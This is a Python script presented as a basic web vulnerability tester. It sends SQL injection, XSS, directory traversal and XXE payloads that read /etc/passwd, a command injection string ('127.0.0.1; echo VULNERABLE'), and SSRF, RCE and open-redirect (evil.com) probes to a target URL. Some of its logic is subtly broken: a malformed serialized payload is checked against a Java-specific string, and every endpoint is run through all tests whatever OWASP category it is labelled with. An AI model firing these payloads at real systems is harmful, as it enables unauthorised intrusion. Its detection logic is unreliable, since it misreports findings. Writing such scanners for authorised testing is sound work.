#########################################################################################################################################################################################
# Basic Python script example to look at a web application for possible vulnerabilities in a web application.
# python vulnerability_tester.py
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace /example_endpoint with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
#########################################################################################################################################################################################


import requests
import re

# Function to test for SQL injection vulnerability
def test_sql_injection(url):
    payload = "' OR 1=1--"
    response = requests.get(url + payload)
    if re.search(r"error in your SQL syntax|mysql_fetch_array", response.text, re.IGNORECASE):
        return True
    return False

# Function to test for XSS vulnerability
def test_xss(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + payload)
    if payload in response.text:
        return True
    return False

# Function to test for insecure deserialization vulnerability
def test_insecure_deserialization(url):
    payload = "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fX0="
    headers = {"Cookie": "data=" + payload}
    response = requests.get(url, headers=headers)
    if "ClassLoader" in response.text:
        return True
    return False

# Function to test for directory traversal vulnerability
def test_directory_traversal(url):
    payload = "../../../../../../etc/passwd"
    response = requests.get(url + payload)
    if "root:x:0:0" in response.text:
        return True
    return False

# Function to test for server-side request forgery (SSRF) vulnerability
def test_ssrf(url):
    payload = "http://localhost:8080"
    response = requests.get(url + "?url=" + payload)
    if "localhost" in response.text:
        return True
    return False

# Function to test for remote code execution (RCE) vulnerability
def test_rce(url):
    payload = "echo%20VULNERABLE"
    response = requests.get(url + "?cmd=" + payload)
    if "VULNERABLE" in response.text:
        return True
    return False

# Function to test for XML external entity (XXE) vulnerability
def test_xxe(url):
    payload = """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [
                    <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=payload, headers=headers)
    if "root:x:0:0" in response.text:
        return True
    return False

# Function to test for command injection vulnerability
def test_command_injection(url):
    payload = "127.0.0.1; echo VULNERABLE"
    response = requests.get(url + "?ip=" + payload)
    if "VULNERABLE" in response.text:
        return True
    return False

# Function to test for open redirect vulnerability
def test_open_redirect(url):
    payload = "http://evil.com"
    response = requests.get(url + "?redirect=" + payload)
    if "evil.com" in response.url:
        return True
    return False

# Main function to test all vulnerabilities
def test_vulnerabilities(vulnerabilities, base_url):
    for vulnerability, endpoint in vulnerabilities.items():
        url = base_url + endpoint
        print(f"Testing {vulnerability} at {url}")
        vulnerabilities_found = []

        if test_sql_injection(url):
            vulnerabilities_found.append("SQL Injection")

        if test_xss(url):
            vulnerabilities_found.append("Cross-Site Scripting (XSS)")

        if test_insecure_deserialization(url):
            vulnerabilities_found.append("Insecure Deserialization")

        if test_directory_traversal(url):
            vulnerabilities_found.append("Directory Traversal")

        if test_ssrf(url):
            vulnerabilities_found.append("Server-Side Request Forgery (SSRF)")

        if test_rce(url):
            vulnerabilities_found.append("Remote Code Execution (RCE)")

        if test_xxe(url):
            vulnerabilities_found.append("XML External Entity (XXE)")

        if test_command_injection(url):
            vulnerabilities_found.append("Command Injection")

        if test_open_redirect(url):
            vulnerabilities_found.append("Open Redirect")

        if vulnerabilities_found:
            print(f"Vulnerability {vulnerability} may be present: {', '.join(vulnerabilities_found)}")
        else:
            print(f"No vulnerabilities found for {vulnerability}")

if __name__ == "__main__":
    vulnerabilities = {
        "A01:2021-Broken Access Control": "/example_endpoint1",
        "A02:2021-Cryptographic Failures": "/example_endpoint2",
        # Add more vulnerabilities here
    }
    base_url = "http://your_base_url"  # Change "http://your_base_url" to your base URL
    test_vulnerabilities(vulnerabilities, base_url)
